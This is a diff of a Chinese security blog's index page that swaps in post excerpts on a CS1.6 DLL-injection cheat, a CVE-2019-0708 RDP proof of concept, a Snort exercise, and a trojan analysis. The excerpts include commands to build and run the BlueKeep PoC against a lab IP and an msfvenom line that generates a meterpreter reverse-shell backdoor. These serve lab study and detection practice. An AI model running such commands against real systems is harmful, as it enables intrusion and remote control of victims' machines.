@@ -143,6 +143,341 @@
     <div class="card">
     
     <div class="card-image">
+        <a href="/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/" class="image is-7by1">
+            <img class="thumbnail" src="/gallery/thumbnails/cs.jpg" alt="CS1.6DLL注入外挂">
+        </a>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-07-11T15:01:47.000Z">2019-07-11</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/%E5%8F%8D%E5%A4%96%E6%8C%82/">反外挂</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 730 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/">CS1.6DLL注入外挂</a>
+            
+        </h1>
+        <div class="content">
+            <p>研究外挂只是想学一下r0,r3攻防对抗，不干坏事，乖巧.jpg</p>
+<p>这一次做一下锁血</p>
+<p>首先常规操作获取血量地址：<br><img src="https://i.loli.net/2019/07/22/5d35d4989bfc534573.png"></p>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/#more">阅读更多</a>
+                </div>
+            </div>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-image">
+        <a href="/2019/05/CVE-2019-0708/" class="image is-7by1">
+            <img class="thumbnail" src="/gallery/thumbnails/cve20190708.png" alt="CVE-2019-0708">
+        </a>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-05-24T14:32:13.000Z">2019-05-24</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CVE/">CVE</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    9 分钟 读完 (大约 1421 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2019/05/CVE-2019-0708/">CVE-2019-0708</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><strong>复现环境：</strong></p>
+<blockquote>
+<p>攻击机：Kali Linux（Windows子系统）</p>
+<p>目标主机：Windows 7 SP1 64位</p>
+</blockquote>
+<p><strong>准备环境|Poc下载/编译</strong></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dh-autoreconf</span><br><span class="line">sudo apt install libssl-dev</span><br><span class="line">sudo apt install libx11-dev</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zerosum0x0&#x2F;CVE-2019-0708.git</span><br><span class="line">cd CVE-2019-0708&#x2F;rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773&#x2F;</span><br><span class="line">.&#x2F;bootstrap</span><br><span class="line">.&#x2F;configure --disable-credssp --disable-smartcard</span><br><span class="line">make</span><br><span class="line">.&#x2F;rdesktop 192.168.1.7:3389</span><br></pre></td></tr></table></figure>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/05/CVE-2019-0708/#more">阅读更多</a>
+                </div>
+            </div>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-image">
+        <a href="/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/" class="image is-7by1">
+            <img class="thumbnail" src="/gallery/thumbnails/snort.png" alt="开源网络入侵检测系统-Snort实战">
+        </a>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-05-19T01:08:10.000Z">2019-05-19</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">入侵检测</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    13 分钟 读完 (大约 1957 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/">开源网络入侵检测系统-Snort实战</a>
+            
+        </h1>
+        <div class="content">
+            <p>Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是大名鼎鼎的meterpreter。</p>
+<p><strong>安装Snort</strong></p>
+<p>安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。</p>
+<p>Kali启动！</p>
+<p>用Kali Linux中的msfvenom生成一个后门程序：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.60.130 LPORT=6666 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/#more">阅读更多</a>
+                </div>
+            </div>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-image">
+        <a href="/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" class="image is-7by1">
+            <img class="thumbnail" src="/gallery/thumbnails/trojan-anna.jpg" alt="远程控制木马分析报告">
+        </a>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-05-17T08:51:26.000Z">2019-05-17</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">Windows恶意代码</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    16 分钟 读完 (大约 2330 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">远程控制木马分析报告</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE"><a href="#样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE" class="headerlink" title="样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE"></a>样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</h2><h3 id="样本基本信息："><a href="#样本基本信息：" class="headerlink" title="样本基本信息："></a>样本基本信息：</h3><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Filename</td>
+<td>18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>b9b34748f958c31e12ae3741f728be99</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>a806386497e280612eadbe87e2104550c95ab617</td>
+</tr>
+<tr>
+<td>File Type</td>
+<td>Win32 EXE</td>
+</tr>
+<tr>
+<td>Magic</td>
+<td>MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</td>
+</tr>
+<tr>
+<td>SSDeep</td>
+<td>12288:DKGk6+Tjk6PQEAEd0bpkRgNyPBODdgVRX6Tw:Dz+TwNE0NfcAT</td>
+</tr>
+<tr>
+<td>File Size</td>
+<td>467.39 KB</td>
+</tr>
+</tbody></table>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</p>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/#more">阅读更多</a>
+                </div>
+            </div>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-image">
+        <a href="/2019/05/WallpaperEngine%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/" class="image is-7by1">
+            <img class="thumbnail" src="/gallery/thumbnails/wallpaperengine.jpg" alt="WallpaperEngine资源提取">
+        </a>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-05-17T05:09:44.000Z">2019-05-17</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/%E7%94%9F%E6%B4%BB/">生活</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    几秒 读完 (大约 65 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2019/05/WallpaperEngine%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96/">WallpaperEngine资源提取</a>
+            
+        </h1>
+        <div class="content">
+            <p>有时在WallpaperEngine中发现自己喜欢的静态壁纸想将其中图片从包文件提取出来的话直接在Kali Linux中运行命令：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 包文件</span><br></pre></td></tr></table></figure>
+
+<p>在output文件夹中可以看到提取出来的内容。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-image">
         <a href="/2019/05/Windows%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/" class="image is-7by1">
             <img class="thumbnail" src="/gallery/thumbnails/windows-anti-debug.jpg" alt="Windows反调试实现与绕过姿势汇总">
         </a>
@@ -424,291 +759,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-04-26T01:55:30.000Z">2019-04-26</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    15 分钟 读完 (大约 2319 个字)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2019/04/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/">加壳与脱壳</a>
-            
-        </h1>
-        <div class="content">
-            <hr>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>加壳原理：</strong>加壳器是将一个可执行文件作为输入，输出一个全新的可执行文件，被加壳的可执行文件经过压缩，加密或者其他转换。多数假客气采用压缩算法压缩原始文件，加壳器通过加密原始可执行文件并且实施一些反逆向技术的实现如防反汇编，反调试以及虚拟化等，加壳器既可以打包整个可执行文件，包括所有的数据与资源节，也可以仅打包代码和资源节。</p>
-<p><strong>脱壳存根：</strong>可执行程序的入口点直线脱壳存根而不是原始代码，原始程序通常存储在杰克程序的一个或者多个附加的节中，脱壳存根负责脱壳源程序：</p>
-<ul>
-<li>将原始程序脱壳到内存中</li>
-<li>解析原始可执行文件的所有导入函数</li>
-<li>将可执行程序转移到原始的程序入口点</li>
-</ul>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/04/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-04-25T02:33:01.000Z">2019-04-25</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    12 分钟 读完 (大约 1868 个字)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2019/04/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/">反虚拟机技术</a>
-            
-        </h1>
-        <div class="content">
-            <hr>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>恶意代码编写者经常使用反虚拟机技术逃避分析，恶意代码可以使用这种技术探测自己是否运行在虚拟机中。</p>
-<p><strong>VMware痕迹：</strong>VM虚拟环境在系统中遗留了很对痕迹，特别是在安装Vmtools之后，恶意代码可以通过存在于操作系统文件系统、注册表和进程列表中标记痕迹，探测VM虚拟环境的存在。</p>
-<p>安装<code>VMtools</code>的主机上通常会运行三个相关进程：<code>VMwareService.exe</code>、<code>VMwareTray.exe</code>、<code>VmwareUser.exe</code>。恶意代码在进程列表中中搜索带有<code>VMware</code>字符串的进程，就能找到这些进程。</p>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/04/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-04-24T14:41:15.000Z">2019-04-24</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    4 分钟 读完 (大约 555 个字)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2019/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/">恶意代码的网络特征</a>
-            
-        </h1>
-        <div class="content">
-            <hr>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>OPSEC-操作安全性：攻击者可以通过多种方法来探测到是否有研究人员对恶意代码进行的测试：</p>
-<ul>
-<li>发送带有某个特定连接的针对性访问的网络钓鱼邮件，观察是否有从期望区域之外的IP地址的访问请求</li>
-<li>设计一种利用方式，在博客篇评论中创建一个经过编码的链接，从而创建一个私人但是可以公开的感染审计记录</li>
-<li>在恶意代码中嵌入一个未使用的域名，观察这个域名的解析记录</li>
-</ul>
-<p><strong>Snort检测：</strong><a target="_blank" rel="noopener" href="https://www.snort.org/">https://www.snort.org/</a></p>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-04-23T11:49:39.000Z">2019-04-23</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    14 分钟 读完 (大约 2061 个字)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2019/04/%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/">数据加密</a>
-            
-        </h1>
-        <div class="content">
-            <hr>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>分析加密算法的目的：</strong>恶意代码使用加密来达到各种各样的目的，最常见的是加密网络通信，同时，唯一代码也会用加密来隐藏它的内部工作：</p>
-<ul>
-<li>隐藏配置信息</li>
-<li>窃取信息之前将它保存到一个临时文件</li>
-<li>存储需要的字符串</li>
-<li>将恶意代码伪装成一个合法的工具</li>
-</ul>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/04/%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-04-19T13:47:36.000Z">2019-04-19</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    2 分钟 读完 (大约 302 个字)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2019/04/Windows10%E5%AE%89%E8%A3%85Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/">Windows10安装Linux子系统</a>
-            
-        </h1>
-        <div class="content">
-            <p>开启开发者模式：</p>
-<p><img src="https://i.loli.net/2019/04/19/5cb9d1caac36b.png"></p>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/04/Windows10%E5%AE%89%E8%A3%85Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -777,7 +827,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        74
+                        79
                     </p>
                 </div>
             </div>
@@ -797,7 +847,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        81
+                        85
                     </p>
                 </div>
             </div>
@@ -922,7 +972,7 @@
                 <span class="level-item">WEB安全</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">2</span>
+                <span class="level-item tag">3</span>
             </span>
         </a></li><li>
         <a class="level is-marginless" href="/categories/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">
@@ -1002,7 +1052,7 @@
                 <span class="level-item">渗透测试</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">1</span>
+                <span class="level-item tag">2</span>
             </span>
         </a></li><li>
         <a class="level is-marginless" href="/categories/%E7%94%9F%E6%B4%BB/">
@@ -1024,7 +1074,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/2018%E5%B9%B4%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" style="font-size: 10px;">2018年工业信息安全技能大赛</a> <a href="/tags/2018%E6%8A%A4%E7%BD%91%E6%9D%AF/" style="font-size: 10px;">2018护网杯</a> <a href="/tags/APT/" style="font-size: 11.25px;">APT</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/CVE/" style="font-size: 12.5px;">CVE</a> <a href="/tags/CrackMe/" style="font-size: 11.25px;">CrackMe</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/DLL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">DLL注入</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/IDA/" style="font-size: 10px;">IDA</a> <a href="/tags/IDA-Pro/" style="font-size: 10px;">IDA Pro</a> <a href="/tags/IDS/" style="font-size: 10px;">IDS</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Kali-Linux/" style="font-size: 10px;">Kali Linux</a> <a href="/tags/Linux/" style="font-size: 13.75px;">Linux</a> <a href="/tags/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/" style="font-size: 10px;">Linux动态链接库</a> <a href="/tags/Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">Linux子系统</a> <a href="/tags/OllyDbg/" style="font-size: 10px;">OllyDbg</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/PWN/" style="font-size: 18.75px;">PWN</a> <a href="/tags/PwnTools/" style="font-size: 10px;">PwnTools</a> <a href="/tags/Pwnable-kr/" style="font-size: 10px;">Pwnable.kr</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/ShellCode/" style="font-size: 11.25px;">ShellCode</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Slmail/" style="font-size: 10px;">Slmail</a> <a href="/tags/Snort/" style="font-size: 10px;">Snort</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/WinDbg/" style="font-size: 10px;">WinDbg</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" style="font-size: 11.25px;">Windows恶意代码</a> <a href="/tags/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">Windows系统安全</a> <a href="/tags/Wordpress/" style="font-size: 11.25px;">Wordpress</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 15px;">二进制安全</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">信息安全</a> <a href="/tags/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" style="font-size: 10px;">内核调试</a> <a href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">分析报告</a> <a href="/tags/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/" style="font-size: 10px;">加壳与脱壳</a> <a href="/tags/%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">加密</a> <a href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" style="font-size: 12.5px;">动态分析</a> <a href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">动态分析技术</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" style="font-size: 10px;">动态调试</a> <a href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/" style="font-size: 10px;">反汇编</a> <a href="/tags/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">反虚拟机技术</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size: 11.25px;">反调试</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%B1%80%E5%8A%BF/" style="font-size: 10px;">安全局势</a> <a href="/tags/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" style="font-size: 10px;">安全竞赛</a> <a href="/tags/%E5%B0%8F%E7%AA%8D%E9%97%A8/" style="font-size: 10px;">小窍门</a> <a href="/tags/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;">工业控制安全</a> <a href="/tags/%E5%BF%83%E5%BE%97/" style="font-size: 11.25px;">心得</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" style="font-size: 20px;">恶意代码分析</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/" style="font-size: 11.25px;">恶意代码分析实战</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/" style="font-size: 10px;">恶意代码启动方式</a> <a href="/tags/%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/" style="font-size: 10px;">恶意行为分析</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/" style="font-size: 10px;">数据包分析</a> <a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">木马</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a> <a href="/tags/%E6%A1%8C%E9%9D%A2/" style="font-size: 10px;">桌面</a> <a href="/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">模糊测试</a> <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">汇编语言</a> <a href="/tags/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">游戏安全</a> <a href="/tags/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%9C%A8%E9%A9%AC%E5%8C%96%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">特洛伊木马化技术</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">破解</a> <a href="/tags/%E7%A6%BB%E7%BA%BF%E7%BF%BB%E8%AF%91/" style="font-size: 10px;">离线翻译</a> <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E8%AF%86%E5%88%AB/" style="font-size: 10px;">网络流量识别</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" 